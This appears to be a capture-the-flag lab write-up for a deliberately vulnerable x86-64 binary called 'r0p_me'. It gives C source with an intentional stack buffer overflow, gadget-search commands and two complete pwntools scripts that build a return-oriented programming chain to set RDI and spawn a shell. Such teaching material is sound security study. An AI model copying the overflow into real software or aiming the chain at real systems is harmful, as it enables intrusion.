# Challenge 03: R0P_Me - ROP with Arguments

**Difficulty**: ★★★☆☆ Medium  
**Binary**: `r0p_me`  
**Port**: 1339  
**Category**: Return-Oriented Programming (ROP) / Calling Convention

## Description

The `win()` function now requires an argument: `magic == 0x13371337`. You must use ROP to load this value into `RDI` (1st argument register) before calling `win()`.

## Source Code Analysis

```c
void win(unsigned long magic)
{
    if (magic != 0x13371337)
        return;

    puts("Correct!");
    system("/bin/sh");
}

void vulnerable(void)
{
    char buffer[64];
    read(0, buffer, 256);
}
```

### Vulnerability

Same buffer overflow as Returnal (64-byte buffer, 256-byte read).
But `win()` requires `RDI = 0x13371337`.

## Binary Protections

```bash
$ checksec --file=r0p_me
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## x86-64 Calling Convention (System V AMD64 ABI)

| Argument | Register |
|----------|----------|
| 1st      | RDI      |
| 2nd      | RSI      |
| 3rd      | RDX      |
| 4th      | RCX      |
| 5th      | R8       |
| 6th      | R9       |

To call `win(0x13371337)`, we need `RDI = 0x13371337` before the call.

## ROP Gadgets

We need a gadget to pop a value from stack into RDI:
```
pop rdi
ret
```

When this gadget executes:
1. `pop rdi` - loads value at RSP into RDI, increments RSP by 8
2. `ret` - pops next value from stack into RIP, jumps there

### Finding the Gadget

```bash
ROPgadget --binary r0p_me | grep "pop rdi"
# Example output: 0x00000000004012bb : pop rdi ; ret

# Or with ropper:
ropper --file r0p_me --search "pop rdi"
```

## Exploitation: ROP Chain

### Stack Layout

```
High Addresses
|------------------------|
| win() address          |  <-- RIP jumps here after gadget (RDI = 0x13371337)
|------------------------|
| 0x13371337 (8 bytes)   |  <-- pop rdi loads this into RDI
|------------------------|
| pop rdi; ret address   |  <-- vulnerable() returns here first
|------------------------|
| Saved RBP (8 bytes)    |  <-- Padding
|------------------------|
| buffer[64] (64 bytes)  |  <-- Padding
|------------------------|
Low Addresses
```

### Offset Calculation

Buffer (64) + Saved RBP (8) = **72 bytes** to reach RIP.

### Exploit Script

```python
from pwn import *

p = process('./r0p_me')
# p = remote('localhost', 1339)

# Addresses (find with GDB/ROPgadget)
pop_rdi = 0x4012bb    # pop rdi ; ret
win_addr = 0x401176   # win() address
magic = 0x13371337

offset = 72

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(magic)
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

### Using pwntools ROP Helper

```python
from pwn import *

elf = ELF('./r0p_me')
p = process('./r0p_me')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
win_addr = elf.symbols['win']

payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(0x13371337)
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

## Flag

Successful exploit gives interactive shell. Read flag.txt.

## Key Concepts Learned

- System V AMD64 calling convention
- ROP gadgets: reusing existing code ending in `ret`
- Register control via `pop reg; ret`
- Chaining multiple returns
- pwntools ROP automation

## Progressive Hints

1. On x86-64, where is the 1st function argument passed? (Not on stack!)
2. What instruction loads a value from stack into a register? `pop <reg>`
3. Find gadget: `ROPgadget --binary r0p_me | grep "pop rdi"`
4. Place `0x13371337` immediately after the gadget address on the stack